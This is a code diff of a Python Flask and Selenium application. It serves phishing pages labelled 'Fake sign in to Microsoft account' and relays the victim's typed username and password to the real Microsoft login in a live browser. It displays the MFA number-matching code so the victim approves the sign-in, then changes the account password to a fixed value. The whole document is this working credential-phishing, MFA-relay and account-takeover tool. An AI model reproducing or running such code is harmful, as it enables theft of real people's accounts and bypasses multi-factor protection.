@@ -16,8 +16,12 @@ def NEW_PASSWORD(): return "a" * 8
 def WEB_DRIVER_PATH(): return os.path.join(os.getcwd(), WEB_DRIVER_NAME())
 def WEB_DRIVER_SERVICE(): return Service(executable_path = WEB_DRIVER_PATH())
 
-DRIVER = webdriver.Firefox(service = WEB_DRIVER_SERVICE())
+def NAME_PAGE(form): return render_template("login.html", title="Fake sign in", header="Fake sign in", form=form)
+def PASSWORD_PAGE(form): return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=form)
+def AUTHENTICATION_PAGE(authentication_code): return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
+def INDEX_PAGE(): return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
 
+DRIVER = webdriver.Firefox(service = WEB_DRIVER_SERVICE())
 DRIVER.get("https://myapps.microsoft.com")
 
 password_changed = False
@@ -26,26 +30,26 @@ def change_password():
     global password_changed
 
     DRIVER.get("https://mysignins.microsoft.com/security-info/password/change")
-    NEW_PASSWORD_FIELD = WebDriverWait(DRIVER, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
-    CONFIRM_PASSWORD_FIELD = DRIVER.find_element(By.NAME, "newPasswordConfirm")
+    new_password_field = WebDriverWait(DRIVER, 60).until(EC.presence_of_element_located((By.NAME, "newPassword")))
+    confirm_password_field = DRIVER.find_element(By.NAME, "newPasswordConfirm")
 
-    NEW_PASSWORD_FIELD.send_keys(NEW_PASSWORD())
-    CONFIRM_PASSWORD_FIELD.send_keys(NEW_PASSWORD())
+    new_password_field.send_keys(NEW_PASSWORD())
+    confirm_password_field.send_keys(NEW_PASSWORD())
 
-    SUBMIT_BUTTON = DRIVER.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
-    SUBMIT_BUTTON.click()
+    submit_button = DRIVER.find_element(By.CSS_SELECTOR, "[aria-label=Submit]")
+    submit_button.click()
 
     password_changed = True
 
 def get_authentication_code():
     try:
-        AUTHENTICATION_CODE = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
-        return AUTHENTICATION_CODE.text
+        authentication_code = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idRichContext_DisplaySign")))
+        return authentication_code.text
 
     except:
         try:
-            RESEND_REQUEST = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
-            RESEND_REQUEST.click()
+            resend_request = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, "idA_SAASDS_Resend")))
+            resend_request.click()
             return get_authentication_code()
 
         except:
@@ -57,26 +61,27 @@ def enter_field(field_name, value, error_id, clear):
 
     try:
         error = WebDriverWait(DRIVER, 5).until(EC.presence_of_element_located((By.ID, error_id)))
+
         if clear:
             field.clear()
+
         return False
 
     except:
         return True
 
+def enter_name(name):
+    return enter_field("loginfmt", name, "usernameError", True)
+
 def enter_password(password):
     return enter_field("passwd", password, "passwordError", False)
 
-def enter_name(name):
-    return enter_field("loginfmt", name, "usernameError", True)
-    
 @app.route("/")
 def index():
     if "name" in session and "password" in session and password_changed:
-        return render_template("index.html", title="Fake Apps", header="Fake dashboard", name=session["name"])
+        return INDEX_PAGE()
 
     return redirect(url_for("login"))
-
 
 @app.route("/login", methods=["GET", "POST"])
 def login():
@@ -89,31 +94,29 @@ def login():
     elif "name" not in session:
         if name_form.validate_on_submit() and enter_name(name_form.name.data):
             session["name"] = name_form.name.data
-            return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
+            return PASSWORD_PAGE(password_form)
     
-        return render_template("login.html", title="Fake sign in", header="Fake sign in", form=name_form)
+        return NAME_PAGE(name_form)
 
-    else:
-        if "password" in session:
-            authentication_code = get_authentication_code()
-            if authentication_code:
-                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
-
-            elif not password_changed:
-                change_password()
-
-            try:
-                WebDriverWait(DRIVER, 4).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
-
-            except:
-                DRIVER.quit()
-
-            return redirect(url_for("index"))       
-
-        elif password_form.validate_on_submit() and enter_password(password_form.password.data):
+    elif "password" not in session:
+        if password_form.validate_on_submit() and enter_password(password_form.password.data):
             session["password"] = password_form.password.data
-            authentication_code = get_authentication_code()
-            if authentication_code:
-                return render_template("login.html", seconds_per_refresh=4, title="Fake sign in to Microsoft account", header="Approve sign in request", authentication_code=authentication_code)
+            return redirect(url_for("login"))
 
-        return render_template("login.html", title="Fake sign in to Microsoft account", header="Enter password", form=password_form)
+        return PASSWORD_PAGE(password_form)
+
+    elif "password" in session:
+        authentication_code = get_authentication_code()
+        if authentication_code:
+            return AUTHENTICATION_PAGE(authentication_code)
+
+        elif not password_changed:
+            change_password()
+
+        try:
+            WebDriverWait(DRIVER, 4).until(EC.presence_of_element_located((By.NAME, "Wait until password changes")))
+
+        except:
+            DRIVER.quit()
+
+        return redirect(url_for("index"))
